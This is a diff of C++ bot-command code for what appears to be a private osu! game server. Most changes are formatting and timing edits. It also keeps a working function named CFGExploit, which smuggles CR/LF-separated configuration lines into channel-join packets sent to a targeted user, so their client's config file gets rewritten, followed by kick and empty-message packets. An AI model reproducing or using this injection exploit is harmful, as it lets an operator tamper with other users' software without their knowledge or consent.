@@ -2,13 +2,7 @@
 
 
 namespace BOT_COMMANDS {
-
-
 	__forceinline std::string Roll(_User* u, const DWORD Max){return u->Username + " rolled " + std::to_string(BR::UGetRand(0, (Max) ? Max : 100));}
-
-
-
-
 }
 
 __forceinline DWORD Safe_stoul(const std::string &Input){
@@ -104,7 +98,7 @@ __forceinline bool Fetus(const std::string &Target) {
 
 void ReplaceAll(std::string &str, const std::string& from, const std::string& to) {
 	size_t start_pos = 0;
-	while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
+	while ((start_pos = str.find(from, start_pos)) != std::string::npos){
 		str.replace(start_pos, from.length(), to);
 		start_pos += to.length(); // Handles case where 'to' is a substring of 'from'
 	}
@@ -120,16 +114,16 @@ std::string CFGExploit(const std::string &Target,std::string &NewCFGLine){
 	u->qLock.lock();
 	u->HyperMode = 1;
 	u->addQueNonLocking(_BanchoPacket(OPac::server_getAttention));
-	for(DWORD i=0;i<500;i++)
+	for(DWORD i=0;i<10;i++)
 		u->addQueNonLocking(bPacket::GenericString(OPac::server_channelJoinSuccess, "# \r\n" + NewCFGLine + "\r\nChatChannels = #osu" + std::to_string(i)));
 
 	u->addQueNonLocking(bPacket::Message("BanchoBot",Target,"Do fish blink",0));
 
-	int dtime = clock() + 500;
+	u->addQueDelayNonLocking(_DelayedBanchoPacket(1, bPacket::GenericString(OPac::server_channelKicked, "BanchoBot")));
 
-	u->addQueDelayNonLocking(_DelayedBanchoPacket(dtime, bPacket::GenericString(OPac::server_channelKicked, "BanchoBot")));
-	dtime += 500;
-	u->addQueDelayNonLocking(_DelayedBanchoPacket(dtime, bPacket::GenericInt32(OPac::server_supporterGMT,UserType::Tournament)));
+	const _BanchoPacket fPacket = bPacket::Message("", "", "", 0);
+	for(DWORD i=0;i<16;i++)
+		u->addQueDelayNonLocking(_DelayedBanchoPacket(2, fPacket));
 	u->qLock.unlock();
 
 	return "Done.";
@@ -174,7 +168,7 @@ std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PermSeeRe
 
 		return "not completus. That user does not exist.";
 	}
-	if (Split[0] == "!alert") {
+	if (Split[0] == "!alert"){
 
 		if (!(Priv & Privileges::AdminDev))goto INSUFFICIENTPRIV;
 
@@ -185,7 +179,6 @@ std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PermSeeRe
 		for (DWORD i = 1; i < Split.size(); i++)
 			Message += (i > 1) ? " " + Split[i] : Split[i];
 
-		//ReplaceAll(Message, "\\n", "\n");
 		if (Message.size() == 0)
 			return "An empty alert would make everyone reconnect...";
 
@@ -202,7 +195,7 @@ std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PermSeeRe
 		u->addQue(bPacket::UserPanel(998,0));
 		u->addQue(bPacket::UserStats(998, 0));
 
-		u->addQueDelay(_DelayedBanchoPacket(clock() + 8000,bPacket::GenericInt32(OPac::server_spectatorJoined, 998)));
+		u->addQueDelay(_DelayedBanchoPacket(1,bPacket::GenericInt32(OPac::server_spectatorJoined, 998)));
 
 		return "";
 	}
@@ -299,12 +292,12 @@ std::string ProcessCommand(_User* u,const std::string &Command, DWORD &PermSeeRe
 		return "";
 	}
 
-	if (Split[0] == "!choosescore" || Split[0] == "!cs"){
+	/*if (Split[0] == "!choosescore" || Split[0] == "!cs"){
 		u->Menu.aux1 = 0;
 		u->Menu.LastPage = 0;
 		u->Menu.State = Menu_ChooseScore;
 		return "";
-	}
+	}*/
 
 	//search hard coded commands
 
